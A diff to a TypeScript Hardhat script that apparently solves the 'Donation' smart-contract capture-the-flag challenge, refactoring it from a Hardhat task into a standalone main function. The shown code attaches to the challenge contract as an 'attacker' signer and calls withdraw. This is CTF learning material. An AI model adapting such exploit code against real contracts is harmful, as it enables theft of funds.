@@ -1,12 +1,12 @@
 import { BigNumber } from "ethers";
-import { task } from "hardhat/config";
+import { ethers } from "hardhat";
 
 const contractAddress = "0xb78C8028CD2443202f7D9934f8a5DC05BB022e5c";
 
-task("donation", "Solves the 'Donation' challenge", async (_taskArgs, hre) => {
-  const [_, attacker] = await hre.ethers.getSigners();
+async function main() {
+  const [_, attacker] = await ethers.getSigners();
 
-  const factory = await hre.ethers.getContractFactory("DonationChallenge");
+  const factory = await ethers.getContractFactory("DonationChallenge");
   const contract = factory.attach(contractAddress);
 
   const addressValue = BigNumber.from(await attacker.getAddress());
@@ -18,4 +18,9 @@ task("donation", "Solves the 'Donation' challenge", async (_taskArgs, hre) => {
 
   const withdrawTx = await contract.connect(attacker).withdraw();
   await withdrawTx.wait();
+}
+
+main().catch(error => {
+  console.error(error);
+  process.exit(1);
 });
